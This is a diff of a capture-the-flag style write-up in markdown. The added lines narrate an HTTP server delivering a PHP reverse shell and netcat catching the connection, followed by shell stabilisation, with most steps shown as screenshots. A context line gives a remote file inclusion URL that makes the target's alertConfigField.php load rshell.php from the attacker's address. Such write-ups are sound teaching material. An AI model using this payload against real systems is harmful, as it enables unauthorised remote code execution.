@@ -130,7 +130,19 @@ We will create a http.server on port 80 and netcat:
 
 ![](../../img/Pasted%20image%2020220827221945.png)
 
-Then, after performing this link, we can now see that the 
+Then, after performing this link, we can now see that the httpserver has provided the php-reverse-shell file and netcat has now connected to the payload:
+
+![](../../img/Pasted%20image%2020220827222042.png)
+
+![](../../img/Pasted%20image%2020220827222057.png)
+
+![](../../img/Pasted%20image%2020220827222109.png)
+
+then performed shell stabilisation:
+
+![](../../img/Pasted%20image%2020220827222126.png)
+
+
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
 
